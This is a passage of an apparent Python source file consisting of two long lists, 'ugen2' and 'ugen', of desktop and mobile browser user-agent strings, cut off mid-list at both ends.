Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
ugen2=['Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 EdgiOS/121.2277.107 Mobile/15E148 Safari/605.1.15', 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Config/91.2.2121.13', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Trailer/93.3.3695.30', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 AtContent/95.5.5392.49', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0.1 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.3.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/116.0.1938.72 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Config/92.2.2788.20', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 GLS/100.10.9415.94', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 AtContent/95.5.5392.49', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 DuckDuckGo/7 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 OpenWave/94.4.4504.39', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Trailer/93.3.3516.28', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.3.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 RDDocuments/8.4.8.940']
ugen=['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5; rv:123.0esr) Gecko/20100101 Firefox/123.0esr', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/117.0.2045.48 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0.1 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPX/2.1.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 8.1.0; C5 2019 Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Agency/98.8.8188.80', 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Herring/95.1.1930.31', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Android 8.1.0; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Trailer/93.3.3695.30', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.2.3', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Config/92.2.7601.2', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.141 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Viewer/99.9.9009.89', 'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.3.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Agency/98.8.8175.80', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 